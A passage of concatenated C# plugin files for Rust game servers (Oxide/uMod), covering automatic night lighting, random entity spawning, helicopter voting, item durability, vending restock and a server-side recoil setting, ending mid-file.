            {
                if (oven == null || fuel == null) return;
                ConsumeTypes type = StringToType(oven?.ShortPrefabName ?? string.Empty);
                if (type == ConsumeTypes.None) return;

                if (configData.LightTypes[type])
                    fuel.amount++;                
            }
        }
        void OnEntitySpawned(BaseEntity entity)
        {
            if (isActivated)
            {
                if (entity == null) return;
                if (entity is BaseOven)
                    CheckType(entity as BaseOven);
            }
        }
        void OnEntityDeath(BaseEntity entity, HitInfo hitInfo)
        {
            if (entity == null) return;
            if (entity is BaseOven && lights.Contains(entity as BaseOven))
                lights.Remove(entity as BaseOven);
        }
        void Unload()
        {
            if (timeCheck != null)
                timeCheck.Destroy();
        }
        #endregion

        #region Functions
        void FindLights()
        {
            var ovens = UnityEngine.Object.FindObjectsOfType<BaseOven>().ToList();
            foreach (var oven in ovens)            
                CheckType(oven);            
            TimeLoop();
        }
        void CheckType(BaseOven oven)
        {
            if (oven == null) return;
            ConsumeTypes type = StringToType(oven?.ShortPrefabName ?? string.Empty);
            if (type == ConsumeTypes.None) return;
            if(configData.LightTypes[type])            
                lights.Add(oven);
        }
        void TimeLoop()
        {
            timeCheck = timer.Once(20, () =>
            {
                if (isEnabled)
                    CheckTime();
                TimeLoop();
            });
        }
        void CheckTime()
        {
            var time = TOD_Sky.Instance.Cycle.Hour;
            if (time >= configData.SunsetHour)
            {
                if (!lightsOn)
                {
                    ToggleLanterns(true);
                }

            }
            else if (time >= configData.SunriseHour && time < configData.SunsetHour)
            {
                if (lightsOn)
                {
                    ToggleLanterns(false);
                }
            }
        }        
        void ToggleLanterns(bool status)
        {
            lightsOn = status;
            for (int i = 0; i < lights.Count; i++)
            {
                var light = lights[i];
                if (configData.ConsumeFuel)
                {
                    if (status && !light.IsInvoking("Cook"))
                        light.StartCooking();
                    else if (!status && light.IsInvoking("Cook"))
                        light.StopCooking();
                }
                else
                {
                    if (light.IsOn() == status) continue;
                    light.SetFlag(BaseEntity.Flags.On, status);
                }                
            }
        }
        ConsumeTypes StringToType(string name)
        {
            switch (name)
            {
                case "campfire":
                    return ConsumeTypes.Campfires;
                case "furnace":
                    return ConsumeTypes.Furnace;
                case "furnace.large":
                    return ConsumeTypes.LargeFurnace;               
                case "ceilinglight.deployed":
                    return ConsumeTypes.CeilingLight;
                case "lantern.deployed":
                    return ConsumeTypes.Lanterns;
                case "jackolantern.angry":
                    return ConsumeTypes.JackOLantern;
                case "jackolantern.happy":
                    return ConsumeTypes.JackOLantern;                
                default:
                    return ConsumeTypes.None;
            }
        }
        #endregion

        #region Commands
        [ChatCommand("lantern")]
        void cmdLantern(BasePlayer player, string command, string[] args)
        {
            if (!permission.UserHasPermission(player.UserIDString, "nightlantern.use")) return;
            if (isEnabled)
            {
                isEnabled = false;
                if (lightsOn)
                    ToggleLanterns(false);
                SendReply(player, lang.GetMessage("You have disabled auto lights", this, player.UserIDString));
                return;
            }
            else
            {
                isEnabled = true;
                if (!lightsOn)
                    CheckTime();
                SendReply(player, lang.GetMessage("You have enabled auto lights", this, player.UserIDString));
            }
        }
        #endregion

        #region Config   
        enum ConsumeTypes
        {
            Campfires, CeilingLight, Furnace, LargeFurnace, Lanterns, JackOLantern, None
        }
        private ConfigData configData;
        class LightTypes
        {
            public bool Campfires { get; set; }
            public bool Lanterns { get; set; }
            public bool CeilingLights { get; set; }
            public bool Furnaces { get; set; }
            public bool JackOLanterns { get; set; }

        }
        class ConfigData
        {
            public bool ConsumeFuel { get; set; } 
            public Dictionary<ConsumeTypes, bool> LightTypes { get; set; }           
            public float SunriseHour { get; set; }
            public float SunsetHour { get; set; }            
        }
        private void LoadVariables()
        {
            LoadConfigVariables();
            SaveConfig();
        }
        protected override void LoadDefaultConfig()
        {
            var config = new ConfigData
            {
                ConsumeFuel = true,
                LightTypes = new Dictionary<ConsumeTypes, bool>
                {
                    {ConsumeTypes.Campfires, true },
                    {ConsumeTypes.CeilingLight, true },
                    {ConsumeTypes.Furnace, true },
                    {ConsumeTypes.LargeFurnace, true },
                    {ConsumeTypes.JackOLantern, true },
                    {ConsumeTypes.Lanterns, true }
                },
                SunriseHour = 7.5f,
                SunsetHour = 18.5f
            };
            SaveConfig(config);
        }
        private void LoadConfigVariables() => configData = Config.ReadObject<ConfigData>();
        void SaveConfig(ConfigData config) => Config.WriteObject(config, true);
        #endregion
    }
}


// --- End of file: NightLantern.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/RandomSpawner.cs ---
// --- Original Local Path: RandomSpawner.cs ---

using System.Collections.Generic;
using System.Linq;
using System;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Random Spawner", "LaserHydra", "1.0.0", ResourceId = 0)]
    [Description("Randomly Spawn a specific amount of an entity on the map")]
    class RandomSpawner : RustPlugin
    {
        ////////////////////////////////////////
        ///     On Plugin Loaded
        ////////////////////////////////////////

        void Loaded()
        {
            permission.RegisterPermission("rspawn.getprefabs", this);
            permission.RegisterPermission("rspawn.use", this);
        }

        ////////////////////////////////////////
        ///     Commands
        ////////////////////////////////////////

        [ConsoleCommand("getprefabs")]
        void ccmdGetPrefabs(ConsoleSystem.Arg arg)
        {
            if (arg == null) return;
            
            BasePlayer player = null;

            if (arg.connection != null && arg.connection.player != null)
            {
                player = arg.connection.player as BasePlayer;

                if (!permission.UserHasPermission(player.UserIDString, "rspawn.getprefabs"))
                    return;
            }
            
            List<string> prefabs = (from prefab in GameManifest.Get().pooledStrings
                                    select prefab.str).ToList();
            
            ConVar.Server.Log("oxide/logs/Prefabs.txt", ListToString(prefabs, 0, Environment.NewLine));

            if (player == null)
                Puts("Created a list of entity prefabs located in oxide/logs/Prefabs.txt");
            else
            {
                Puts("Created a list of entity prefabs located in oxide/logs/Prefabs.txt");
                player.ConsoleMessage("Created a list of entity prefabs located in oxide/logs/Prefabs.txt");
            }
        }

        [ConsoleCommand("rspawn")]
        void ccmdSpawnRandom(ConsoleSystem.Arg arg)
        {
            RunAsChatCommand(arg, cmdSpawnRandom);
        }

        [ChatCommand("rspawn")]
        void cmdSpawnRandom(BasePlayer player, string cmd, string[] args)
        {
            if(!permission.UserHasPermission(player.UserIDString, "rspawn.use"))
            {
                SendChatMessage(player, "You don't have permission to use this command.");
                return;
            }

            if(args.Length != 2)
            {
                SendChatMessage(player, "Syntax: /rspawn <amount> \"<entity prefab>\"");
                return;
            }

            string prefab = args[1];
            int amount = 0;

            try
            {
                amount = Convert.ToInt32(args[0]);
            }
            catch(FormatException ex)
            {
                SendChatMessage(player, "Amount must be a number value!");
                return;
            }

            for (int i = 1; i <= amount; i++)
            {
                SpawnEntity(prefab, GetRandomVector());
            }
        }

        ////////////////////////////////////////
        ///     Entity Related
        ////////////////////////////////////////

        private void SpawnEntity(string prefab, Vector3 location)
        {
            BaseEntity entity = GameManager.server.CreateEntity(prefab, location);

            if (entity != null)
            {
                entity.Spawn(true);
            }
        }

        ////////////////////////////////////////
        ///     Vector Related
        ////////////////////////////////////////

        Vector3 GetRandomVector()
        {
            float max = ConVar.Server.worldsize / 2;

            float x = UnityEngine.Random.Range(max * (-1), max);
            float y = UnityEngine.Random.Range(200, 300);
            float z = UnityEngine.Random.Range(max * (-1), max);

            object terrainHeight = GetTerrainHeight(new Vector3(x, 300, z));

            if (terrainHeight is Vector3)
                return (Vector3) terrainHeight; 
            else
                return new Vector3(x, y, z);
        }

        object GetTerrainHeight(Vector3 location)
        {
            int mask = LayerMask.GetMask(new string[] { "Terrain", "World", "Construction" });
            float distanceToWater = location.y - TerrainMeta.WaterMap.GetHeight(location);
            RaycastHit rayHit;
            if(Physics.Raycast(new Ray(location, Vector3.down), out rayHit, distanceToWater, mask))
            {
                return rayHit.point;
            }

            return false;
        }

        ////////////////////////////////////////
        ///     Teleporting
        ////////////////////////////////////////

        void Teleport(BasePlayer player, Vector3 destination)
        {
            player.SetPlayerFlag(BasePlayer.PlayerFlags.Sleeping, true);
            if (!BasePlayer.sleepingPlayerList.Contains(player)) BasePlayer.sleepingPlayerList.Add(player);

            player.CancelInvoke("InventoryUpdate");
            player.inventory.crafting.CancelAll(true);

            player.MovePosition(destination);
            player.ClientRPCPlayer(null, player, "ForcePositionTo", destination, null, null, null, null);
            player.TransformChanged();
            player.SetPlayerFlag(BasePlayer.PlayerFlags.ReceivingSnapshot, true);
            player.UpdateNetworkGroup();

            player.SendNetworkUpdateImmediate(false);
            player.ClientRPCPlayer(null, player, "StartLoading", null, null, null, null, null);
            player.SendFullSnapshot();
        }

        ////////////////////////////////////////
        ///     Console Command Handling
        ////////////////////////////////////////

        void RunAsChatCommand(ConsoleSystem.Arg arg, Action<BasePlayer, string, string[]> command)
        {
            if (arg == null) return;

            BasePlayer player = null;
            string cmd = string.Empty;
            string[] args = new string[0];

            if (arg.HasArgs()) args = arg.Args;
            if (arg.connection.player == null) return;

            player = arg.connection.player as BasePlayer;
            cmd = arg.cmd?.name ?? "unknown";

            command(player, cmd, args);
        }

        ////////////////////////////////////////
        ///     Converting
        ////////////////////////////////////////

        string ListToString(List<string> list, int first, string seperator)
        {
            return String.Join(seperator, list.Skip(first).ToArray());
        }

        ////////////////////////////////////////
        ///     Chat Handling
        ////////////////////////////////////////

        void BroadcastChat(string prefix, string msg = null) => PrintToChat(msg == null ? prefix : "<color=#00FF8D>" + prefix + "</color>: " + msg);

        void SendChatMessage(BasePlayer player, string prefix, string msg = null) => SendReply(player, msg == null ? prefix : "<color=#00FF8D>" + prefix + "</color>: " + msg);
    }
}


// --- End of file: RandomSpawner.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HeliVote.cs ---
// --- Original Local Path: HeliVote.cs ---

using System.Collections.Generic;
using System;
using UnityEngine;


namespace Oxide.Plugins
{
    [Info("HeliVote", "k1lly0u", "0.1.31", ResourceId = 1665)]
    class HeliVote : RustPlugin
    {
        bool Changed;

        private List<ulong> receivedYes;
        private List<ulong> receivedNo;
        private List<BaseEntity> currentHelis;

        private bool voteOpen;
        private bool helisActive;
        private bool timeBetween;
        private BasePlayer initiator;

        #region oxide hooks
        //////////////////////////////////////////////////////////////////////////////////////
        // Oxide Hooks ///////////////////////////////////////////////////////////////////////
        //////////////////////////////////////////////////////////////////////////////////////
        void Loaded()
        {
            permission.RegisterPermission("helivote.use", this);
            lang.RegisterMessages(messages, this);
            LoadVariables();            
        }
        void OnServerInitialized()
        {
            voteOpen = false;
            helisActive = false;
            timeBetween = false;
            initiator = null;
            receivedYes = new List<ulong>();
            receivedNo = new List<ulong>();
            currentHelis = new List<BaseEntity>();
        }
        void LoadDefaultConfig()
        {
            Puts("Creating a new config file");
            Config.Clear();
            LoadVariables();
        }
        void Unload()
        {
            receivedNo.Clear();
            receivedYes.Clear();
            foreach(var heli in currentHelis)
            {
                heli.KillMessage();
            }
            currentHelis.Clear();
        }
        void OnEntityDeath(BaseEntity entity, HitInfo hitinfo)
        {
            if (entity == null) return;
            if (helisActive)
            {
                if (currentHelis.Contains(entity))
                {
                    currentHelis.Remove(entity);
                    if (currentHelis.Count == 0)
                        helisActive = false;
                }
            }
        }
        #endregion

        #region methods
        //////////////////////////////////////////////////////////////////////////////////////
        // Vote Methods //////////////////////////////////////////////////////////////////////
        //////////////////////////////////////////////////////////////////////////////////////
                
        private bool alreadyVoted(BasePlayer player)
        {
            if (receivedNo.Contains(player.userID) || receivedYes.Contains(player.userID))
                return true;
            return false;
        }
        private bool TallyVotes()
        {
            var Yes = receivedYes.Count;
            var No = receivedNo.Count;
            float requiredVotes = BasePlayer.activePlayerList.Count * requiredVotesPercentage;
            if (useMajorityRules)
                if (Yes >= No)
                    return true;
            if (Yes > No && Yes >= requiredVotes) return true;
            return false;
        }
        private void voteEnd(int amount)
        {
            bool success = TallyVotes();
            if (success)
            {
                msgAll(string.Format(lang.GetMessage("voteSuccess", this), amount));
                helisActive = true;
                CallHeli(amount);                        
            }
            else
            {                
                msgAll(string.Format(lang.GetMessage("voteFail", this), minBetween));               
            }
            voteOpen = false;
            initiator = null;
            clearData();
            timeBetween = true;
            timer.Once(minBetween * 60, () => timeBetween = false);
        }
        private void clearData()
        {
            receivedYes.Clear();
            receivedNo.Clear();
        }
        private void CallHeli(int amount)
        {
            int i = 0;
            while (i < amount)
            {
                BaseEntity entity = GameManager.server.CreateEntity("assets/prefabs/npc/patrol helicopter/patrolhelicopter.prefab", new Vector3(), new Quaternion(), true);
                if (!entity) return;
                PatrolHelicopterAI heliAI = entity.GetComponent<PatrolHelicopterAI>();
                entity.Spawn();
                currentHelis.Add(entity);

                float mapSize = (TerrainMeta.Size.x / 2) - 50f;
                entity.transform.position = new Vector3(-mapSize, 30, mapSize);
                if (heliToInit)
                {
                    if (initiator != null)
                    entity.GetComponent<PatrolHelicopterAI>().State_Move_Enter(initiator.transform.position + new Vector3(0.0f, 20f, 0.0f));
                }
                i++;
            }
        }
        private void VoteTimer(int amount)
        {
            var time = voteOpenTimer * 60;
            timer.Repeat(1, time, () =>
            {                
                time--;
                if (time == 0)
                {
                    voteEnd(amount);
                    return;
                }
                if (time == 180)
                {
                    msgAll(string.Format(lang.GetMessage("timeLeft", this), 2, "Minutes"));
                }
                if (time == 120)
                {
                    msgAll(string.Format(lang.GetMessage("timeLeft", this), 2, "Minutes"));
                }
                if (time == 60)
                {
                    msgAll(string.Format(lang.GetMessage("timeLeft", this), 1, "Minute"));
                }
                if (time == 30)
                {
                    msgAll(string.Format(lang.GetMessage("timeLeft", this), 30, "Seconds"));
                }
                if (time == 10)
                {
                    msgAll(string.Format(lang.GetMessage("timeLeft", this), 10, "Seconds"));
                }
            });
        }
        private void msgAll(string left)
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                if (usePerms)
                    if (!canVote(player)) return;
                SendReply(player, lang.GetMessage("title", this, player.UserIDString) + left);
            }
        }
        private bool CheckIfStillExist()
        {
            int i = 0;
            var allobjects = UnityEngine.Object.FindObjectsOfType<BaseHelicopter>();
            foreach (var gobject in allobjects)
            {
                if (gobject.prefabID == 3703982321)
                {
                    if (currentHelis.Contains(gobject))
                        i++;
                }
            }
            if (i != 0) return true;

            helisActive = false;
            currentHelis.Clear();
            return false;

        }
        #endregion

        #region chat/console commands

        [ChatCommand("helivote")]
        private void cmdHeiVote(BasePlayer player, string command, string[] args)
        {
            if (usePerms)
                if (!canVote(player)) return;
            if (args.Length == 0)
            {
                SendReply(player, string.Format(lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("badSyn", this, player.UserIDString), maxAmount));
                return;
            }

            if (args.Length >= 1)
            {
                if (args[0].ToLower() == "open")
                {
                    if (voteOpen)
                    {
                        SendReply(player, lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("voteOpen", this, player.UserIDString));
                        return;
                    }
                    if (timeBetween)
                    {
                        SendReply(player, lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("cooldown", this, player.UserIDString));
                        return;
                    }                   
                    if (CheckIfStillExist())
                    {
                        SendReply(player, lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("heliActive", this, player.UserIDString));
                        return;
                    }

                    int amount = 1;
                    if (args.Length == 2)
                    {
                        if (!int.TryParse(args[1], out amount))
                        {
                            SendReply(player, lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("invAmount", this, player.UserIDString));
                            return;
                        }
                    }
                    if (amount > maxAmount)
                        amount = maxAmount;

                    msgAll(string.Format(lang.GetMessage("opened", this, player.UserIDString), amount));

                    float required = BasePlayer.activePlayerList.Count * requiredVotesPercentage;
                    if (required < 1) required = 1;

                    msgAll(string.Format(lang.GetMessage("required", this, player.UserIDString), (int)required));
                    voteOpen = true;
                    receivedYes.Add(player.userID);
                    initiator = player;
                    VoteTimer(amount);
                    return;
                }
                else if (args[0].ToLower() == "yes")
                {
                    if (!voteOpen)
                    {
                        SendReply(player, lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("noOpen", this, player.UserIDString));
                        return;
                    }
                    if (!alreadyVoted(player))
                    {
                        receivedYes.Add(player.userID);
                        SendReply(player, lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("yesVote", this, player.UserIDString));
                        if (displayProgress)
                            msgAll(string.Format(lang.GetMessage("totalVotes", this, player.UserIDString), receivedYes.Count, receivedNo.Count));
                        return;
                    }
                    SendReply(player, lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("alreadyVoted", this, player.UserIDString));
                    return;
                }
                else if (args[0].ToLower() == "no")
                {
                    if (!voteOpen)
                    {
                        SendReply(player, lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("noOpen", this, player.UserIDString));
                        return;
                    }
                    if (!alreadyVoted(player))
                    {
                        receivedNo.Add(player.userID);
                        SendReply(player, lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("noVote", this, player.UserIDString));
                        if (displayProgress)
                            msgAll(string.Format(lang.GetMessage("totalVotes", this, player.UserIDString), receivedYes.Count, receivedNo.Count));
                        return;
                    }
                    SendReply(player, lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("alreadyVoted", this, player.UserIDString));
                    return;
                }
            }
        }
        [ConsoleCommand("helivote")]
        private void ccmdVote(ConsoleSystem.Arg arg)
        {
            if (!isAuthCon(arg)) return;
            int amount = 1;
            if (arg.Args != null)
                if (arg.Args.Length == 1)
                    int.TryParse(arg.Args[0], out amount);

            msgAll(string.Format(lang.GetMessage("opened", this), amount));

            float required = BasePlayer.activePlayerList.Count * requiredVotesPercentage;
            if (required < 1) required = 1;

            msgAll(string.Format(lang.GetMessage("required", this), (int)required));
            voteOpen = true;
            VoteTimer(amount);
        }

        private bool canVote(BasePlayer player)
        {
            if (permission.UserHasPermission(player.userID.ToString(), "helivote.use")) return true;
            else if (isAuth(player)) return true;
            SendReply(player, lang.GetMessage("title", this, player.UserIDString) + lang.GetMessage("noPerms", this, player.UserIDString));
            return false;
        }
        bool isAuth(BasePlayer player)
        {
            if (player.net.connection != null)
            {
                if (player.net.connection.authLevel < 1)
                {
                    SendReply(player, lang.GetMessage("noPerms", this));
                    return false;
                }
            }
            return true;
        }
        bool isAuthCon(ConsoleSystem.Arg arg)
        {
            if (arg.connection != null)
            {
                if (arg.connection.authLevel < 1)
                {
                    SendReply(arg, lang.GetMessage("noPerms", this));
                    return false;
                }
            }
            return true;
        }
       
        #endregion

        #region config
        //////////////////////////////////////////////////////////////////////////////////////
        // Configuration /////////////////////////////////////////////////////////////////////
        //////////////////////////////////////////////////////////////////////////////////////

        static float requiredVotesPercentage = 0.5f;
        static bool useMajorityRules = true;
        static int voteOpenTimer = 4;
        static bool displayProgress = true;
        static int auth = 1;
        static int minBetween = 5;
        static int maxAmount = 4;
        static bool heliToInit = false;
        static bool usePerms = false;     

        private void LoadVariables()
        {
            LoadConfigVariables();
            SaveConfig();
        }
        private void LoadConfigVariables()
        {
            CheckCfgFloat("Options - Required yes vote percentage", ref requiredVotesPercentage);
            CheckCfg("Options - Timers - Open vote timer (minutes)", ref voteOpenTimer);
            CheckCfg("Options - Timers - Minimum time between votes (minutes)", ref minBetween);
            CheckCfg("Options - Display vote progress", ref displayProgress);
            CheckCfg("Options - Maximum helicopters to call", ref maxAmount);
            CheckCfg("Options - Send helicopters to the initiator", ref heliToInit);
            CheckCfg("Options - Use permission system only", ref usePerms);
            CheckCfg("Options - Use majority rules", ref useMajorityRules);
        }
        private void CheckCfg<T>(string Key, ref T var)
        {
            if (Config[Key] is T)
                var = (T)Config[Key];
            else
                Config[Key] = var;
        }
        private void CheckCfgFloat(string Key, ref float var)
        {

            if (Config[Key] != null)
                var = Convert.ToSingle(Config[Key]);
            else
                Config[Key] = var;
        }
        object GetConfig(string menu, string datavalue, object defaultValue)
        {
            var data = Config[menu] as Dictionary<string, object>;
            if (data == null)
            {
                data = new Dictionary<string, object>();
                Config[menu] = data;
                Changed = true;
            }
            object value;
            if (!data.TryGetValue(datavalue, out value))
            {
                value = defaultValue;
                data[datavalue] = value;
                Changed = true;
            }
            return value;
        }
        #endregion

        #region messages
        //////////////////////////////////////////////////////////////////////////////////////
        // Messages //////////////////////////////////////////////////////////////////////////
        //////////////////////////////////////////////////////////////////////////////////////

        Dictionary<string, string> messages = new Dictionary<string, string>()
        {
            {"title", "<color=#cc2900>HeliVote</color> : " },
            {"noPerms", "You do not have permission to use this command" },
            {"badSyn", "<color=#ff704d>/helivote open ##</color> - Open a vote to spawn ## amount of helicopters. Maximum is <color=#ff704d>{0}</color>" },
            {"voteOpen", "There is already a vote open" },
            {"noOpen", "There isn't a vote open right now" },
            {"yesVote", "You have voted yes"},
            {"noVote", "You have voted no" },
            {"alreadyVoted", "You have already voted" },
            {"opened", "A vote to call <color=#ff704d>{0}</color> helicopter(s) is now open! Use <color=#ff704d>/helivote yes</color> or <color=#ff704d>/helivote no</color>" },
            {"required", "Minimum yes votes required is <color=#ff704d>{0}</color>" },
            {"invAmount", "You have entered a invalid number" },
            {"timeLeft", "Voting ends in {0} {1}, use <color=#ff704d>/helivote yes</color> or <color=#ff704d>/helivote no</color>" },
            {"cooldown", "You must wait for the cooldown period to end before opening a vote" },
            {"voteSuccess", "The vote was successful, spawning <color=#ff704d>{0}</color> helicopters!" },
            {"voteFail", "The vote failed to meet the requirements, try again in <color=#ff704d>{0}</color> minutes" },
            {"heliActive", "There are still active helicopters from the last vote. Can not open a new vote until they are destroyed" },
            {"totalVotes", "<color=#ff704d>{0}</color> vote(s) for Yes, <color=#ff704d>{1}</color> vote(s) for No" }
        };
        #endregion

    }
}


// --- End of file: HeliVote.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/NeverWear.cs ---
// --- Original Local Path: NeverWear.cs ---

using System.Collections.Generic;

namespace Oxide.Plugins
{
    [Info("NeverWear", "k1lly0u", "0.1.32", ResourceId = 1816)]
    class NeverWear : RustPlugin
    {
        void Loaded() => RegisterPermissions();
        void OnServerInitialized() => LoadVariables();
        private void RegisterPermissions()
        {
            permission.RegisterPermission("neverwear.use", this);
            permission.RegisterPermission("neverwear.attire", this);
            permission.RegisterPermission("neverwear.weapons", this);
            permission.RegisterPermission("neverwear.tools", this);
        }
        private bool HasPerm(BasePlayer player, string perm)
        {
            if (permission.UserHasPermission(player.UserIDString, perm)) return true;
            return false;
        }
        void OnLoseCondition(Item item, ref float amount)
        {
            if (item != null)
            {
                BasePlayer player;
                if (item.GetOwnerPlayer() == null)
                {
                    if (!item.info.shortname.Contains(".mod.")) return;
                    if (item?.parent?.GetType() == null) return;
                    if (item?.parentItem?.GetOwnerPlayer() == null) return;
                    player = item.parentItem.GetOwnerPlayer();
                }
                else player = item.GetOwnerPlayer();
                if (player != null)
                {
                    var def = ItemManager.FindItemDefinition(item.info.itemid);
                    if ((configData.useWhiteList && configData.WhitelistedItems.Contains(def.shortname) && HasPerm(player, "neverwear.use"))
                        || (def.category == ItemCategory.Weapon && configData.useWeapons && HasPerm(player, "neverwear.weapons"))
                        || (def.category == ItemCategory.Attire && configData.useAttire && HasPerm(player, "neverwear.attire"))
                        || (def.category == ItemCategory.Tool && configData.useTools && HasPerm(player, "neverwear.tools")))
                        if (item.hasCondition)
                            item.RepairCondition(amount);
                }
            }          
            return;
        }

        #region Config        
        private ConfigData configData;
        class ConfigData
        {
            public bool useWeapons { get; set; }
            public bool useTools { get; set; }            
            public bool useAttire { get; set; }
            public bool useWhiteList { get; set; }
            public List<string> WhitelistedItems { get; set; }
        }
        private void LoadVariables()
        {
            LoadConfigVariables();
            SaveConfig();
        }
        protected override void LoadDefaultConfig()
        {
            var config = new ConfigData
            {
                useTools = true,
                useAttire = false,
                useWeapons = false,
                useWhiteList = false,
                WhitelistedItems = new List<string>
                {
                    "hatchet",
                    "pickaxe",
                    "rifle.bolt",
                    "rifle.ak"
                }
            };
            SaveConfig(config);
        }
        private void LoadConfigVariables() => configData = Config.ReadObject<ConfigData>();
        void SaveConfig(ConfigData config) => Config.WriteObject(config, true);
        #endregion
    }
}


// --- End of file: NeverWear.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/VendingInStock.cs ---
// --- Original Local Path: VendingInStock.cs ---

using Oxide.Core;

namespace Oxide.Plugins
{
    [Info("Vending In Stock", "AVOcoder", "1.0.5")]
    [Description("VendingMachines sell-orders always in stock")]
    class VendingInStock : RustPlugin
    {
        private void OnNpcGiveSoldItem(NPCVendingMachine vm, Item soldItem, BasePlayer buyer)
        {
            if (vm == null || soldItem == null)
                return;

            if (Interface.CallHook("CanNpcGiveSoldItem", vm, soldItem, buyer) != null)
            {
                return;
            }

            Item item = ItemManager.Create(soldItem.info, soldItem.amount, soldItem.skin);
            if (soldItem.blueprintTarget != 0)
            {
                item.blueprintTarget = soldItem.blueprintTarget;
            }

            NextTick(() =>
            {
                if (item == null)
                    return;

                if (vm == null || vm.IsDestroyed) {
                    PrintWarning("NPCVending machine is null or destroyed");
                    item.Remove(0f);
                    return;
                }

                vm.transactionActive = true;
                if (!item.MoveToContainer(vm.inventory, -1, true))
                {
                    PrintWarning(string.Concat(new string[]
                    {
                        "NPCVending machine unable to refill item :",
                        item.info.shortname,
                        " buyer :",
                        buyer.displayName,
                        " - Contact Developers"
                    }));
                    item.Remove(0f);
                }

                vm.transactionActive = false;
                vm.FullUpdate();
            });
        }
    }
}


// --- End of file: VendingInStock.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/NoRecoil.cs ---
// --- Original Local Path: NoRecoil.cs ---

using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using UnityEngine;
using System.Linq;
using Oxide.Core;
using System.Text;

namespace Oxide.Plugins
{
	[Info("NoRecoil", "TopPlugin.ru/Sempai#3239", "0.1.7")]
	[Description("Removing recoil from rapid-fire weapons")]
	public class NoRecoil : RustPlugin
	{
        #region Var
        const String PermissionAdmin = "NoRecoil.admin";
		private string[] permittedWeapons = new string[] { "rifle.ak", "rifle.lr300", "smg.thompson", "smg.2", "smg.mp5" };
		#endregion

		#region Data 

		public Dictionary<UInt64, Dictionary<String, Boolean>> Users = new Dictionary<UInt64, Dictionary<String, Boolean>>();

		#endregion

		#region Configuration
		private static Configuration config = new Configuration();
		private class Configuration
		{
			[JsonProperty("Weapon customization")]
			public RecoilWeapon recoilWeapon = new RecoilWeapon();

			internal class RecoilWeapon
			{
				[JsonProperty("Whether to add a prefix to the weapon")]
				public Boolean addPrefixGun;
				[JsonProperty("weapon prefix")]
				public String prefixGun;
				[JsonProperty("Item ShortName / settings")]
				public Dictionary<String, weaponModifer> settingsRecoil = new Dictionary<String, weaponModifer>();

				internal class weaponModifer
				{
					[JsonProperty("Max Ammo (not more than 1000)")]
					public Int32 maxAmmo;
					[JsonProperty("Return percentage 100 - there will be no recoil. 50 - recoil reduced by 50%")]
					public Int32 recoilDeform;
					[JsonProperty("SkinId")]
					public ulong skinId;
				}
			}
				
			public static Configuration GetNewConfiguration()
			{
				return new Configuration
				{
					recoilWeapon = new RecoilWeapon
					{
						addPrefixGun = true,
						prefixGun = "[No recoil]",
						settingsRecoil = new Dictionary<string, RecoilWeapon.weaponModifer>
						{
							["rifle.ak"] = new RecoilWeapon.weaponModifer { maxAmmo = 30, recoilDeform = 100, skinId = 0UL },
							["rifle.lr300"] = new RecoilWeapon.weaponModifer { maxAmmo = 30, recoilDeform = 100, skinId = 0UL },
							["smg.thompson"] = new RecoilWeapon.weaponModifer { maxAmmo = 20, recoilDeform = 100, skinId = 0UL },
							["smg.2"] = new RecoilWeapon.weaponModifer { maxAmmo = 24, recoilDeform = 100, skinId = 0UL },
							["smg.mp5"] = new RecoilWeapon.weaponModifer { maxAmmo = 30, recoilDeform = 100, skinId = 0UL },
						}
					},
				};
			}
		}

		protected override void LoadConfig()
		{
			base.LoadConfig();
			try
			{
				config = Config.ReadObject<Configuration>();
				if (config == null)
					LoadDefaultConfig();
			}
			catch
			{
				PrintWarning($"Configuration read error 'oxide/config/{Name}', creating a new configuration !!");
				LoadDefaultConfig();
			}

			List<String> removeKey = new List<String>();
            foreach (var item in config.recoilWeapon.settingsRecoil)
            {
				if (!permittedWeapons.Contains(item.Key))
				{
					PrintWarning("You tried to add unauthorized weapons to the config! It has been removed from the config.");
					removeKey.Add(item.Key);
					continue;
				}
				if (item.Value.maxAmmo > 1000)
					config.recoilWeapon.settingsRecoil[item.Key].maxAmmo = 1000;
				if(item.Value.recoilDeform > 100)
					config.recoilWeapon.settingsRecoil[item.Key].recoilDeform = 100;
			}

			if (removeKey.Count > 0)
                foreach (var item in removeKey)
					config.recoilWeapon.settingsRecoil.Remove(item);

			NextTick(SaveConfig);
		}

		protected override void LoadDefaultConfig() => config = Configuration.GetNewConfiguration();
		protected override void SaveConfig() => Config.WriteObject(config);

		#endregion

		#region Lang
		private new void LoadDefaultMessages()
		{
			lang.RegisterMessages(new Dictionary<String, String>
			{
				["NoRecoil_NoPermission"] = "Ha you thought",
				["NoRecoil_WrongSyntaxConsole"] = "Wrong syntax, use : nrg Steam64ID/Nick ShortName",
				["NoRecoil_WrongSyntaxChat"] = "Wrong syntax, use : /nrg ShortName",
				["NoRecoil_PlayerNotFound"] = "There is no such player!",
				["NoRecoil_ErrorNameGun"] = "{0} does not exist in the configuration",
				["NoRecoil_GunGiveSucc"] = "The weapon has been successfully issued to the player!",
				["NoRecoil_UserNotPerm"] = "This player does not have permission to play with this weapon. First he needs to issue permissions - {0}",
				["NoRecoil_OffModification"] = "You have disabled the modification for everything {0}",
				["NoRecoil_EnableModification"] = "Weapon successfully modified",
				["NoRecoil_NoModificationPermission"] = "Ha you thought",
				["NoRecoil_NotAllowed"] = "Ha you thought",
				["NoRecoil_Mustbeactive"] = "Ha you thought",
			}, this);

			lang.RegisterMessages(new Dictionary<String, String>
			{
